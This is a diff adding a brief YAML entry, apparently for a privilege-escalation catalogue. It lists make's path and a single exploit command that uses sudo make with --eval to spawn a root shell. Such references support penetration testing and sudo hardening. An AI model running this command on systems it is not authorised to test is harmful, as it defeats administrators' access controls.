@@ -1,0 +1,4 @@
+name: make
+binary_path: /usr/bin/make
+exploit_cmds:
+- sudo /usr/bin/make --eval='$(shell /bin/sh 1>&0)' .
